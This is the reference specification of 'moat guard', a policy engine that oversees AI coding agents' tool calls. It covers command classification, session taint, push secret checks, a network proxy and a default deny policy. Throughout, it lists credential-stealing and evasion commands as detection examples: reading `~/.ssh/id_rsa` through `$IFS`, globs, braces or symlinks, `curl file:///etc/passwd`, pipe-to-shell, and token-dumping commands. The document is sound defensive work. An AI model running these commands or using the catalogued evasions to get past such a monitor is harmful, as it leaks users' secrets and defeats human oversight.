~/.ssh/id_rsa` and an MCP call reading `~/.ssh/id_rsa` with a malformed `url` are denied by `secrets-paths`, not deferred. What follows the failure inside the same simple command or nested command is not classified. Input that does not lex at all yields no parts and is `unparseable` as a whole.

Consequences worth remembering:

- **Deny is absolute.** No allow rule can override a deny rule. To express "nothing of this kind except these", use `defaults` plus allow rules, as the default policy does for `net`.
- A `fetch` is a narrower kind of `net` (ADR-017): `net` patterns in `deny`, `allow` and `ask` match it as well as `fetch` patterns, and with no `defaults.fetch` the `net` default decides it. A `fetch` pattern never matches other network access, so `curl`, `wget`, `nc`, a Claude Code `Monitor` WebSocket and MCP `url` arguments are only judged by `net` rules.
- A host is network evidence (`net`) when it comes from a URL with a scheme or from an argument of a program that names hosts (`curl`, `wget`, `ssh`, `scp`, `sftp`, `rsync`, `nc`, `ncat`, `netcat`, `telnet`, `ftp`, `ping`, `dig`, `nslookup`, `host`, `openssl`, `socat` (its `TCP:host:port` addresses), `mosh`, `lftp`, `aria2c`, `nmap`, `psql`, `mysql`, `redis-cli`, `mongo`, `mongosh`, `http`/`https`, `xh`, `curlie`, `wget2`, `whois`, `traceroute`, `mtr`, `git clone/fetch/pull/push/ls-remote`, also after git's global options such as `-C dir`); for these programs a quoted word is a host too (`curl 'host'`). In inline interpreter code a host in a quoted string is network evidence too (`urlopen('evil.com')`). Any other unquoted word that only looks like a host (`check_runs.0.id`, `config.dev`, `subprocess.run` in a here-document) is still matched by `net` rules, so a host you deny or allow is denied or allowed; when no rule matches it, the catch-all decides it (it is deferred in the default policy), not `defaults.net` (ADR-025).
- An allow rule on `shell` does not allow the paths or hosts the command touches; those are evaluated separately. `cat ~/.ssh/id_rsa` is denied by the path rule even though `cat *` is allowed.
- Arguments that name files become `fs.read`/`fs.write` actions even when they are relative: any word containing `/` (`s/id_rsa`, `src/main.rs`, the value of `--in=keys/k`), and every operand of programs that read or write their operands (`cat`, `head`, `tail`, `less`, `grep`, `rg`, `wc`, `diff`, `base64`, `tar`, `ls`, `find`, `cp`, `mv`, `rm`, `tee`, … ; `shell/tables.rs`), so `cat k` is a read of `<cwd>/k`. Options before `--`, URLs, remote specs (`host:dir`) and the arguments of `echo`/`printf` are not files. Inside the project these reads cost nothing (`project-fs` allows them); an option value such as the `5` in `head -n 5 f` becomes a harmless read of `<cwd>/5`.
- A reserved word that starts a command inside a compound one (`do`, `then`, `else`, `elif`, `if`, `while`, `until`, `!`, `{`) is not the program: `for f in a; do cat x; done` is the command `cat x`, and `done`, `fi`, `}` and `esac` alone run nothing. `for NAME in WORDS` is an `env.set` of `NAME`, and the words are read like any others. A variable set by a command of its own earlier on the line (`n=3; git log -$n`, a `for` variable, `export X=v`; also `readonly`, `local`, `declare` and `typeset` without options, which may set an array, a number or a reference) is a shell variable. When every value it can hold is text the line shows (no `$`, `$( … )`, glob or quoted `~`), it is substituted where it is used and the command is classified once per value, so `d=~/.ssh; cat $d/id_rsa` and `X=~/.ssh; cat $X/id_rsa` are reads of `~/.ssh/id_rsa`. Reading a lowercase one is then no `env.read`; an uppercase name, by convention an environment variable, keeps its `env.read`, and so does any variable whose value is not known. A prefix assignment (`D=x cmd $D`) does not count: the shell expands `$D` before it. A path that still contains a variable the shell expands (other than `$HOME` and `$PWD`, unless the line gave them a value it does not show, as `read HOME` or `HOME=$(cat f)` do; `${project}` is the policy's syntax, so in a command it is the shell's variable `project`, read as empty), or the output of a command (`cat $(cat list)`, `` cat `cmd` ``), is not known: the call gets rule `unparseable` (§4 step 5) and the literal path is still checked, so a deny on it wins. `$PWD` is the working directory. A child shell (`sh -c`) does not see the variables, so `x=1; sh -c 'echo $x'` reads `x`, and an uppercase name's read stays: `NPM_TOKEN=x; echo $NPM_TOKEN` is still a read of `NPM_TOKEN`. A path through a variable whose value is not known is also the atom `@unknown-path <word>`, which `secret-names` asks for when its file name is a key's, a token file's or a `.env`. Where `$IFS` or `${IFS}` stands in a word, the line is classified a second time with it read as a space and both results count, so `cat${IFS}~/.ssh/id_rsa` is a read of the key. A `file:` URL in any argument (`curl file:///etc/passwd`, `--url=FILE:///…`, `%`-escapes decoded) is an `fs.read` of its path. Arguments that are a command line the program runs are classified as one: `watch 'cmd'`, `git rebase --exec`/`-x` (by any prefix git accepts), `git submodule foreach`, `git bisect run`, `git difftool --extcmd`/`-x`, `git filter-branch --*-filter`, `ssh`/`scp`/`sftp -o ProxyCommand=`/`LocalCommand`/`KnownHostsCommand`, `rsync -e`/`--rsh`, `su`/`runuser -c`/`--command`/`--session-command`, and `tar --to-command`, `-I`/`--use-compress-program`, `--checkpoint-action=exec=`, `-F`/`--info-script`/`--new-volume-script` and `--rsh-command`/`--rmt-command` (by any prefix GNU tar accepts, the value attached, after `=` or the next word). `pkexec` and `runuser -u USER` are wrappers like `sudo`.
- Inline code given to an interpreter on the command line is scanned for paths, hosts and variable names (not parsed): `python`/`python3 -c` (also versioned, `python3.12 -c`, `python2.7 -c`), `node -e`/`--eval`/`-p`/`--print`, `deno eval`, `bun -e`, `perl -e`/`-E`, `ruby -e`, `php -r`, `osascript -e`, `pwsh`/`powershell -c`/`-Command`, `lua`/`luajit -e` and `Rscript -e` (`shell/tables.rs`). So `python3.12 -c "open('/Users/you/.ssh/id_rsa')"` is a read of the key.
- Relative paths follow `cd` and `pushd` earlier in the same command line: `cd ~/.ssh && cat id_rsa` is a read of `~/.ssh/id_rsa`. Which commands run after a `cd` succeeds is not modelled (`cd x || cat y`, a failed `cd` before `;`), so a relative path is checked in every directory the line may be in (the session's directory and each `cd` target), strictest wins. A subshell `( … )` restores the directory when it closes; `$( … )` and `sh -c` start from the directory where they appear. `cd` alone is `~`. A target that cannot be known (`cd "$DIR"`, `cd -`, `cd s*`, `pushd +1`, `popd`, and `eval`/`source`, which may `cd` themselves) makes every later relative path unresolvable, so the command gets rule `unparseable` (step 5); absolute paths are still checked normally. More than 16 possible directories is `unparseable` too. `cd` itself adds no new action (a path-looking target is an `fs.read` like any argument). `CDPATH` is not consulted: the shell searches it for a target that does not start with `/`, `./` or `../`, but the classifier cannot see the environment the host started the shell with, so such a target is taken relative to the current directory. Setting `CDPATH` on the line itself (`CDPATH=~ cd .ssh`, `export CDPATH=…`) is an `env.set` that `opaque-code` asks for, and the shell start-up files that could preset it are denied by `shell-rc`.
- `moat guard` checks a path where it really points as well as where it was written: after `ln -s ~/.ssh ./s`, `cat ./s/id_rsa`, `cat s/id_rsa`, `head s/id_rsa` and `grep -r . s/` are denied by `secrets-paths`. A link inside the project that points elsewhere inside the project stays allowed; one that points outside it is checked at its target (`ln -s /etc e; cat e/hosts` is decided as a read of `/etc/hosts`, which the default policy defers), also when the project itself sits under a linked directory (§3.2). `moat policy check` resolves symlinks the same way. Hard links and a link swapped after the check are not seen (ADR-009).
- A path operand or redirection target with an unquoted `*`, `?` or `[` is a glob the shell expands before the command runs, so it is checked as written **and** as every path it names in the real directories: `cat .en?`, `cat .e*`, `cat .[e]nv`, `base64 < .en?` and `cat ~/.ss?/id_rsa` are denied by `secrets-paths` like `cat .env`. The expansion follows `bash`: `*`, `?` and classes (`[ab]`, `[!a]`, `[^a]`; a set with a POSIX class, equivalence class or collating symbol such as `[[:alpha:]]` is taken as any one character, so it names at least what the shell opens) do not match a leading `.` unless the pattern starts with one (`cat *` does not read `.env`, `cat .e*` does), `**` is taken as any number of directories (as with `globstar` or in `zsh`), and a pattern that matches nothing is only its literal word. A component without glob characters after a globbed directory is named whether or not the file exists yet (`~/.ss?/id_rsa` names `~/.ssh/id_rsa` once `~/.ssh` matches), and every match is resolved through symlinks. A quoted or escaped pattern (`cat '.en?'`, `cat .en\?`) is one literal name; an operand with the same text as an unquoted glob elsewhere in the command line is expanded too. Directories are listed only for such operands. When the globs of one call name more than 256 paths, list more than 1024 directories or descend more than 8 levels of `**`, the call gets rule `unparseable` (step 5), and a deny among the paths that were named still wins. `moat policy check` expands globs the same way; without a filesystem (`decide()` with no resolver, the conformance suite without `files`) only the literal is checked.
- Unquoted braces make several words before any other expansion, without the filesystem, as in `bash`: `cat .{env,x}` is checked as `cat .env .x`, so `cat .{env,x}`, `cat .e{n,m}v`, `cat ~/.ssh/{id_rsa,x}` and `{cat,.env}` are denied by `secrets-paths`. Comma lists, nested braces, integer and letter sequences with an optional step and zero padding (`{1..3}`, `{a..e..2}`, `{01..10}`) and several groups in one word (`{a,b}{1,2}`) are expanded in any position, the command name included, and each word made goes through the rules above (`cat .{e,x}n?` is globbed). As in `bash`, `{}`, `{x}`, `{a,b` and invalid sequences stay literal, `${…}` is a variable, quoted or escaped braces (`cat '.{env,x}'`, `\{a,b}`) are one literal name, empty results are dropped and a here-string is not expanded. A word whose braces would make more than 256 words gets rule `unparseable` (step 5); a deny elsewhere in the call still wins.
- The explanation names the rules that produced the final verdict; weaker matches are shown as context (`also:` lines, `context` in JSON).

### 4.1 Session taint

Earlier calls of the same session can make a later call stricter (ADR-020). Taint never
loosens a decision: it adds an `ask` with rule id `session-taint` and merges it like any
other atomic action, so an `allow` becomes `ask` and a `deny` stays `deny`.

| Once the session has… | …these atomic actions ask |
|---|---|
| read secret material: an `fs.read` that the group with id `secrets-paths` names, in whichever list it sits | `net` and `fetch` to every host except the secret's own, and every `mcp` call, `web.search` and `tool.unknown` (OpenMoat cannot see the hosts they reach) |
| read untrusted content: a `fetch`, a `web.search`, or the result of an `mcp` call or a `tool.unknown` | `fs.write` to a protected path |

`secrets-paths` is a **taint-significant rule id**: the engine recognises the base id in `deny`, `repo_ask`, `allow` and `ask`, and recognises `repo:secrets-paths` the same way (a repository policy's group is renamed to `repo:<id>` on merge, §10). Keep the id as `secrets-paths` on any `fs.read` group that names secret material; a rename hides those reads from taint and lets an approved secret read leave the session untainted (#398).

- A secret read from a file belongs to no host, so every host asks. A secret the secrets
  broker (#172) injects will carry its own host, and only that host stays as decided.
- In the default policy `secrets-paths` denies, so no secret read runs and none taints.
  The trigger matters when your policy moves `secrets-paths` to `ask`: once you approve
  the read, the session is tainted.
- Protected paths are files whose change runs code or steers the agent later. The built-in
  list (`taint.rs`) is CI (`.github/workflows/**`, `.gitlab-ci.yml`, `.circleci/**`,
  `azure-pipelines.yml`, `Jenkinsfile`, `.buildkite/**`), git hooks (`.husky/**`,
  `.githooks/**`, `.pre-commit-config.yaml`, `lefthook.yml`), editor tasks (`.vscode/**`), the build and test
  definitions of every ecosystem whose commands the default policy runs: JavaScript
  (`package.json`, `.npmrc`, `.yarnrc`, `.yarnrc.yml`, `pnpm-workspace.yaml`), make, just
  and task (`Makefile`, `makefile`, `GNUmakefile`, `*.mk`, `justfile`, `Taskfile.yml`),
  Rust (`build.rs`, `Cargo.toml`, `.cargo/config.toml`), Go (`go.mod`, `go.work`), CMake
  (`CMakeLists.txt`, `*.cmake`, `CMakePresets.json`), Maven (`pom.xml`, `.mvn/**`, `mvnw`),
  Gradle (`*.gradle`, `*.gradle.kts`, `gradle.properties`, `gradlew`, `gradle/wrapper/**`),
  .NET (`*.csproj`, `*.fsproj`, `*.vbproj`, `*.props`, `*.targets`, `global.json`,
  `NuGet.config`), Ruby (`Rakefile`, `*.rake`, `Gemfile`, `*.gemspec`, `.rspec`), PHP
  (`composer.json`, `artisan`, `phpunit.xml`), Python (`conftest.py`, `pytest.ini`,
  `pyproject.toml`, `setup.py`, `setup.cfg`, `tox.ini`, `noxfile.py`) and containers
  (`Dockerfile`, `docker-compose*.yml`, `compose*.yml`), and agent instructions and
  settings (`CLAUDE.md`, `AGENTS.md`, `.claude/**`, `.claude.json`, `.codex/**`,
  `.cursor/**`, `.cursorrules`, `.mcp.json`, OpenClaw's `.openclaw/openclaw.json`,
  `.openclaw/openmoat/**` and `.openclaw/extensions/**`) and OpenMoat's own `.moat/**`, at any depth:
  every file `runs-later` asks about and every config file `kernel-self` protects (a
  test keeps the lists in step). Source and test files are not protected,
  test-runner configs written in JavaScript (`jest.config.js`) included: they are code the
  run executes like any other file, and the command that runs them is named in a
  protected file.
- A protected-path ask from untrusted content can be answered once per file: `moat allow
  --last` after the ask grants that exact file, and the grant stands while it is newer
  than the session's latest untrusted read (the ask says how). Newer is by audit row, not
  by the clock: the grant records the newest row it saw, so a clock that steps back cannot
  reorder them (a grant written by an older version has no row and is compared by time).
  Once the session reads more untrusted content, the file asks again. A grant made before that read does not
  answer it, other files and sessions still ask, and an ask from a secret the session
  read is never answered by a grant. Answering `s` instead of `y` at that question approves
  every protected write of the session the same way: they stand until the session reads
  untrusted content again, other sessions still ask, and a secret's asks are never
  answered.
- `taint: { protected_writes: [<glob>, …] }` adds path globs (§3.2, `~` and `${project}`
  included) to that list. It only extends: a policy cannot remove a built-in path, and
  `moat policy lint` rejects a `!` exclusion as well as a glob that does not compile.
  Without the key, the built-in list applies alone.
- Shell network to an allowed host (`git fetch`, `gh pr view`) is not counted as untrusted
  content, and a command OpenMoat cannot classify taints nothing it can name.
- `moat guard` reads the history from the audit log: the earlier events of the same host
  session that may have run. Those are allowed calls, and asks on a host that can ask. A
  declined ask is not recorded, so it counts as run. Codex turns an ask into a deny, so
  an ask under Codex never taints. The agent cannot reset its session's taint, and a log
  that cannot be read denies the call (`kernel-error`).
- `moat run`'s proxy applies the same taint to every request of the run (ADR-027). The
  run's hooks link each agent session to the run's audit session (`MOAT_RUN_SESSION`),
  and the proxy folds the linked sessions as the guard does. After a secret read, a
  CONNECT or plain-HTTP request to any host but the secret's own would ask; the proxy
  cannot ask, so it refuses (`session-taint`), the package registries included. A grant
  does not answer it; a new `moat run` starts clean. Untrusted content changes nothing at
  the proxy. The standalone `moat proxy` has no sessions, so taint does not apply there.
  A hook inside `moat run` writes these links through the `moat run` process, which
  decides its calls outside the sandbox (ADR-028).
- Conformance fixtures express a chain with `session:`, the earlier calls that ran.

#### 4.1.1 File provenance

Session taint also follows what a tainted session writes into a file (ADR-029). It
adds no ask of its own: it taints a later session, and that session's calls then
tighten as in §4.1.

- **Recorded.** When a session that read untrusted content (§4.1) makes a call that may
  have run and that writes a file by a literal path (`Write`, `Edit`, `MultiEdit`,
  `NotebookEdit`, `apply_patch`, an MCP tool's file argument, or a shell write such as
  `> file`, `tee`, `cp`), the audit log records the path, the session and what it had
  read. For `Write`, which sends the whole file, it also records the SHA-256 of the
  content (CRLF line ends hashed as LF); for every other write the hash is unknown.
- **Followed.** When any later session reads or runs that path (an `fs.read`, which
  covers `Read`, `cat`, `source`/`.`, `bash file`, `python file` and the other script
  forms the classifier knows, and a program named by a path such as `./run.sh`), and the
  file is a regular file that still holds the recorded content (or the hash is unknown),
  that session is tainted as if it had read untrusted content. The reason names the file
  and the session that wrote it: `read /p/run.sh, which session a wrote after it read
  untrusted content (fetch crates.io)`. What the same call writes (`bash run.sh >
  out.txt`) is recorded as tainted too.
- **Cleared.** A `Write` by a session that read no untrusted content replaces the whole
  file and makes it clean. A partial change by such a session (`Edit`, a shell write)
  may leave what the tainted session wrote, so the file stays tainted whatever its hash
  becomes. A change no session made (an editor, `git checkout`) gives a hashed file
  another content, and it no longer taints. A `session-taint` ask that results is
  answered with `moat allow --last` as in §4.1.
- `taint: { provenance: false }` turns it off: nothing is recorded or followed.
- Not tracked: content copied, renamed or produced indirectly (a build that writes
  output, a script that writes another file), and files under a directory a search
  tool reads (`Grep`, `Glob`).

### 4.2 The push check

A push publishes commits: CI runs them with the repository's secrets, and anyone who can
read the remote can read them. After the steps above, and only when the call is not
already denied, `moat guard` looks at what a push would publish. A push is `git push`,
in any spelling the classifier reads (after git's global options, `-C`, `cd`, `sh -c`,
`sudo`, `$( … )`), and `gh pr create`, which pushes the current branch when it is not
pushed yet. `gh pr merge` publishes nothing local and is not checked.

- **Which commits.** What the push sends (each refspec's source; every branch for
  `--all`, `--branches`, `--mirror` or a glob refspec; every tag for `--tags` or
  `--mirror`; `HEAD` when none is named), minus what the remote has: with no refspec the
  current branch's upstream (`@{u}`); otherwise, or without an upstream, the remote's
  default branch (`refs/remotes/<remote>/HEAD`), else every branch of that remote git
  knows of; for a URL or a path in place of a remote's name, every remote-tracking
  branch. The remote is the one named, else git's own choice (`branch.<b>.pushRemote`,
  `remote.pushDefault`, `branch.<b>.remote`, `origin`). Commits the remote is not known
  to have are all checked, so a first push checks the whole history. Deletions, a
  directory that is not a repository and a branch with no commits check nothing.
- **How.** git runs read-only in each directory the push may run in (`git log`,
  `rev-parse`, `config --get`), with the options that would let a repository's config
  start a program turned off (external diff, text conversion, signature check, file
  system monitor). Every line a commit's diff adds (a merge's against its first parent)
  and every commit message is searched; removed and unchanged lines are not, and
  neither are binary files. Needs git 2.31 or later.
- **`push-secret` (deny).** A line or message holds a known token format with a
  vendor prefix (GitHub, OpenAI and Anthropic, AWS access key ids, Slack, Google API,
  npm, GitLab; the audit log's redaction patterns, without JSON web tokens, which are
  common in test data), or the value of a brokered secret (§2.1) the guard can read (file
  and environment sources, 8 bytes or longer, any letter case). The reason names the
  commit, the file and the kind of token, never the value. A token added and removed
  again inside the push still denies: the push sends both commits. Remove it from the
  commits, or push from a terminal yourself.
- **`push-runs-later` (ask).** The session read untrusted content or a secret (§4.1),
  and the push changes (adds, edits or deletes) one of the project files `runs-later`
  names (§6), at any depth and in any letter case. In a clean session such a push
  stays as the policy decided it.
- **`push-unchecked` (ask).** What the push publishes could not be checked: git took
  longer than 10 s for all of a call's pushes together, the diffs exceed 8 MiB (the
  commit messages or the list of changed files 1 MiB), git failed, a refspec names no
  commit, or the push may run in a directory or repository that is not known (`cd
  "$X"`, `git --git-dir=…`, a git option that keeps the command as written, or
  `GIT_DIR`, `GIT_WORK_TREE`, `GIT_COMMON_DIR`, `GIT_NAMESPACE`, `GIT_OBJECT_DIRECTORY`,
  `GIT_ALTERNATE_OBJECT_DIRECTORIES` or `GIT_CEILING_DIRECTORIES` set on the line).
- **Otherwise** the decision stands unchanged: the check adds nothing to a push it has
  no finding for. Codex and the Continue CLI cannot ask, so the two asks reach them as
  a deny; a `moat allow` grant does not answer them.
- **Limits.** The check reads what git shows at the time of the call: a commit made by
  a later part of the same command line (`git commit -am x && git push`), a variable
  that moves git to another repository exported by an earlier tool call, and a push
  through a program other than `git` and `gh` (an API call, a script) are not seen.

## 5. Verdicts and what the host does

The verdict is the same for every host; the response document is the host's own format.

| Host event | `allow` | `defer` | `ask` | `deny` |
|---|---|---|---|---|
| Claude Code and Codex `PreToolUse` | `{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"allow","permissionDecisionReason":"moat: allow [rule]"}}`, exit 0 | nothing on stdout, exit 0: the host's own permission flow runs (its prompt, auto mode, Codex's approval policy) | same with `"ask"`, exit 0; the host prompts the user with the reason (Codex: a deny that says how to approve) | same with `"deny"`, reason also on stderr, exit 2; the agent sees the rule id and reason |
| Cursor `beforeShellExecution`, `beforeMCPExecution` | `{"permission":"allow","user_message":"moat: allow [rule]","agent_message":"…"}`, exit 0 | `"permission":"ask"`: Cursor's own prompt | `"permission":"ask"`, exit 0 | `"permission":"deny"`, exit 2 |
| Cursor `beforeReadFile`, `preToolUse` | as above | recorded and answered as `ask`: these events cannot prompt and run file tools outside Cursor's sandbox | a deny that says how to approve | `"permission":"deny"`, exit 2 |
| Claude Code `ConfigChange` | `{}` (the changed settings file is loaded), exit 0 | not produced | not produced | `{"decision":"block","reason":"moat: deny [kernel-integrity] — …"}`, exit 2; the session keeps its previous settings |

The reason line has the shape `moat: <verdict> [rule, rule] — reason; reason`.

### 5.1 Rule ids that are not in your policy

These appear in responses and in `moat show` alongside the ids from `policy.yaml`:

| Rule id | Verdict | When |
|---|---|---|
| `default`, `default.<kind>` | from `defaults` | no rule matched the atomic action |
| `unparseable` | ask | the shell command or URL, or part of it, could not be classified safely (§4 step 5) |
| `executables` | deny | the command's program resolves to a path other than its pin (§8.1) |
| `kernel-integrity` | deny | a file pinned by `policy.lock` changed, disappeared or was replaced by a symlink (§8); every call is denied until a person re-pins |
| `settings-drift` | none (audit only) | recorded with the first call of a session decided while the only drift is in Claude Code settings that change no decision (§8); the call's own verdict is unchanged |
| `mcp-server-changed` | deny | the MCP server this tool belongs to has a definition that differs from its pin, or was added since, or its agent's MCP configuration cannot be parsed (§8); only that server's tool calls are denied, until a person runs `moat mcp accept` |
| `mcp-proxy`, `mcp-tool-held` | allow, deny | audit rows of `moat mcp proxy` (host `mcp-proxy`): a tool call passed to the server, or refused because the tool's description or input schema is not the one a person accepted (§8) |
| `kernel-error` | deny | `moat guard` could not evaluate at all: missing state directory, malformed payload, unreadable policy, a repository policy that cannot be read or parsed (§10); exit 2 |
| `repo:<id>` | from its list | a rule of the project's repository policy (§10) |
| `ungoverned` | defer (allow for Cursor) | the host tool is outside policy scope (for example Claude Code `Task`, or `Shell` under Cursor's `preToolUse`, which `beforeShellExecution` already governs); recorded, not evaluated. The host decides it as if no hook had answered; Cursor's hooks have no such answer, so there it is allowed |
| `config-change` | allow | a Claude Code `ConfigChange` for a settings file that is not pinned, or still matches the lock apart from settings drift (§8); a change that names no file is allowed only while every pinned file matches the lock apart from settings drift; recorded |
| `session-taint` | ask | earlier calls of the session read secret material or untrusted content, and this call could carry the secret out or persist the content (§4.1) |
| `push-secret` | deny | a commit a `git push` or `gh pr create` would publish adds a known token format or a brokered secret's value (§4.2) |
| `push-runs-later` | ask | the session read untrusted content or a secret, and the push changes a file `runs-later` names (§4.2) |
| `push-unchecked` | ask | what a push would publish could not be checked within 10 s or 8 MiB, or where it runs is not known (§4.2) |
| `approved-session` | allow | an `ask` for a shell command that a person granted with `moat allow` for this host session (§8.2) |
| `approved-<n>` | allow | a permanent rule in `~/.moat/policy.d/approved.yaml` written by `moat allow --always` |
| `proxy-address`, `proxy-sni`, `proxy-request`, `proxy-upstream`, `proxy-secret` | deny | `moat proxy` refused a connection: a loopback, link-local, metadata, or unnamed private destination, a TLS server name that does not match the CONNECT host or is encrypted (ECH), a request it does not serve, a destination it could not reach, or a brokered secret sent to a host other than its own (§2.1, §5.2) |

### 5.2 `moat proxy`

`moat proxy` decides each connection's host with the same policy and matcher as a fetch
tool's URL. Each host is one `fetch` atom, so `fetch` and `net` lists both apply, deny rules
first. Differences from the hook:

- The proxy cannot prompt. A host whose verdict is `ask` is refused, and so is a host with
  no rule under the default policy (`defaults: fetch: ask`). To open a host to the proxy,
  allow it in a `net` or `fetch` list.
- A `fetch` allow opens the host to every method through the proxy, including requests with a
  body. Inside a CONNECT tunnel the method cannot be seen until TLS termination exists.
- Loopback, link-local, cloud metadata (`metadata.google.internal`, `metadata.goog`,
  `100.100.100.200`, `fd00:ec2::254`) and non-unicast destinations are refused whatever the
  policy allows. This applies to the name as written and to every address it resolves to.
  `local-net` and an allow for `localhost` do not reach this machine through the proxy.
- Private and shared addresses are refused unless the policy names them: `10.0.0.0/8`,
  `172.16.0.0/12`, `192.168.0.0/16`, `100.64.0.0/10` (CGNAT), `198.18.0.0/15`
  (benchmarking) and `fc00::/7` (unique local), including IPv4-mapped,
  IPv4-compatible and NAT64 spellings, and the IPv4 addresses a 6to4 (`2002::/16`) or
  Teredo (`2001::/32`: client and server) address leads to. This is checked on the name as written and on
  every address it resolves to. One such address refuses the whole name, so a wildcard
  allow whose name resolves into the LAN (DNS rebinding) does not reach it.
  To open one, list the address in a `net` or `fetch` allow, either exactly
  (`10.0.0.5`, `fd12::7`) or as a glob that starts with a digit or contains `:`
  (`192.168.1.*`, `fd12::*`). There is no CIDR syntax. The pattern is matched against
  the resolved address in canonical text form (`::ffff:10.0.0.5` is matched as
  `10.0.0.5`; a NAT64 or IPv4-compatible address only by its IPv6 text). A deny rule
  matching that text still wins. Patterns starting with `*`, `?`, `[` or `{`, and name
  patterns such as `*.corp.example`, never open a private address.
- A deny rule naming an address (`net: ["203.0.113.7"]`, `2001:db8::*`) holds for every
  name that resolves to it, public addresses included: one such address refuses the name.

### 5.3 What an operating-system layer can enforce

The policy compiler (ADR-019) derives from `policy.yaml` what an OS layer (a host's
sandbox, Seatbelt, Landlock, the egress proxy) enforces. `moat policy compile [--format
json]` prints it. The host sandboxes of Claude Code, Codex and Cursor (§9) and the
Seatbelt and Landlock rules of `moat run` are generated from it.

- **OS-enforceable:** `fs.read`, `fs.write`, `net` and `fetch` rules and their defaults.
  Patterns are expanded for the session (`~`, `${project}`, both spellings of a linked
  root), and `!` exclusions are kept.
- **Decide-only:** `shell`, `env.read`, `env.set`, `mcp` and `executables`. An OS layer
  cannot see a command line, a variable or a tool name, so only the hook applies these.
- **`ask` and `defer` become deny.** An OS layer can only allow or deny. An `ask` or
  `defer` rule, or an `ask` or `defer` default, is denied there (ADR-025). The hook still
  asks for, or defers, the tool calls it sees. Each such
  narrowing is listed as a loss.
- **Never wider, except listed allowances.** Whatever a backend cannot represent
  exactly, it narrows and reports. An OS layer is wider than the hook only by an
  allowance (ADR-021): `sandbox.read_roots` (§9), which `policy compile` prints under
  `allowances`, and what a host needs to run, which `moat sandbox show` lists. Network
  to the cloud-metadata hosts (`moat.cloud-metadata`) is denied whatever the policy says.

## 6. The default policy, in one table

| List | Rule id | What it covers |
|---|---|---|
| deny | `secrets-paths` | read **and** write of `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.kube`, `~/.config/gh`, `~/.netrc`, `~/.authinfo{,.gpg}`, `~/.docker/config.json`, `~/.config/containers/auth.json` (Podman, Buildah), `~/.config/doctl/config.yaml`, `~/.config/gcloud`, `~/.azure`, `~/.git-credentials`, `~/.npmrc`, `~/.pypirc`, `~/.cargo/credentials{,.toml}`, `~/.gem/credentials`, `~/.pgpass`, `~/.my.cnf`, `~/.mylogin.cnf`, `~/.vault-token`, `~/.terraform.d/credentials.tfrc.json`, `~/.config/op`, `~/.password-store`, `~/.local/share/keyrings`, `~/.zsh_history`, `~/.bash_history`, `.env`, `.env.*` (except `.env.example`, `.env.sample`, `.env.template`), `.envrc`, keychains; commands that print a stored token or password: `gh auth token`, `gh auth status --show-token`/`-t`, `gcloud auth print-access-token`/`print-identity-token`, `az account get-access-token`, `aws configure export-credentials`, `aws configure get *secret*`, `kubectl config view --raw`, `git credential fill`, `git credential-<helper> get`, `security find-generic-password`/`find-internet-password` with `-w` or `-g`, `security dump-keychain`, `vault kv get`, `vault read`, `vault print token`, `op read`, `op item get --reveal`, `heroku auth:token`, and `pass` with any argument (`pass NAME`, `pass show`, `pass grep`, …) except `ls`, `list`, `find`, `search`, `init`, `insert`, `add`, `rm`, `remove`, `delete`, `mv`, `rename`, `cp`, `copy`, `git`, `help`, `version`, which print no password (`pass` alone lists names) |
| deny | `build-credentials` | read **and** write of `~/.m2/settings.xml`, `~/.m2/settings-security.xml` and `~/.gradle/gradle.properties` (repository passwords, signing keys, tokens) by the agent: a shell command naming them, the file tools, MCP arguments. `hook_only` (§2): the host sandboxes and `moat run` do not deny them, so `mvn` and `gradle` keep reading their settings there, and `mvn package` or `./gradlew build` keep their verdict. The caches (`~/.m2/repository`, `~/.gradle/caches`) are not covered |
| deny | `env-secrets` | reading `*_KEY`, `*_TOKEN`, `*_SECRET`, `*_PASSWORD`, `AWS_*`, `GITHUB_TOKEN`, `NPM_TOKEN`, `*_PASS`, `*_PASSWD`, `*_PWD`, `PGPASSWORD`, `*_CREDENTIALS`, `*_DSN`, `DATABASE_URL`, `*_DATABASE_URL`, `REDIS_URL`, `MONGODB_URI`, `MONGO_URL` |
| deny | `env-dump` | `env`, `printenv`, `set`, `export`, `declare`, `typeset` with no arguments (or only `-0`, `-p`, `-x`), also by absolute path: they print every variable, secrets included. `printenv NAME` is an `env.read` of `NAME`. A read of `/proc/<pid>/environ` (also `/proc/self/…` and `/proc/<pid>/task/<tid>/…`) is the atom `@proc-environ <path>`, which this rule denies; it is not a path rule, so no OS sandbox is asked to deny a glob under `/proc` |
| deny | `env-poison` | setting `PATH`, `LD_PRELOAD`, `LD_LIBRARY_PATH`, `DYLD_*`, `NODE_OPTIONS`, `PYTHONPATH`, `GIT_*`, `BASH_ENV`, `ENV`, `PROMPT_COMMAND`, `MOAT_*` |
| deny | `pipe-to-shell` | `curl`/`wget` output, or any decoded/decompressed stream (`base64 -d/-D/--decode`, `openssl … -d`, `xxd -r`, `gunzip`, `zcat`, `gzip -d`, …), piped into a shell or interpreter that reads its program from stdin (`sh`, `bash`, `zsh`, `dash`, `ksh`, `fish`, `python*`, `node`, `perl`, `ruby`, `php`, `deno`, `bun`, `pwsh`); `eval` |
| deny | `destructive` | any write to a raw disk (`/dev/disk*`, `/dev/sd*`, `/dev/nvme*`, …), and any write to the home directory or the root itself (`fs.write` of exactly `~` and `/`, however the path is spelt: `~/`, `$HOME`, `${HOME}`, `/Users/me/`, `~/x/..`), so removing, moving or replacing them with any program and flags; this also denies a command that changes that directory itself (`touch ~`, `chmod 700 ~`) or copies into it entries whose names the command line does not show (`rsync -a dist/ ~/`, `cp * ~/`), while a copy or move of named files into it writes those entries (`cp f ~/` writes `~/f`, which the default policy defers, §3.1), as do writes below them (`mkdir ~/x`, `rm -rf ~/tmp/build`) are unaffected; `rm` of an unexpanded `/*`, `~/*`, `$HOME/*`, `${HOME}/*` or of `//`, and `rm -rf --no-preserve-root`, `git push --force*`/`-f*` (also after the remote, bundled as `-uf`, and a `+refspec` such as `+main` or `+HEAD:main`), remote branch deletion (`git push origin :main`, `--delete`, `-d`), the prefixes of `--force` and `--delete` git accepts as abbreviations (`--for*`, `--de*`; `--mirror` and `--prune` are not denied and defer like any other push), `git reset --hard`, `git clean -fdx`, `git branch -D`, `git stash drop/clear`, `sudo`, `mkfs`, `dd if=`, `shutdown`, `reboot` |
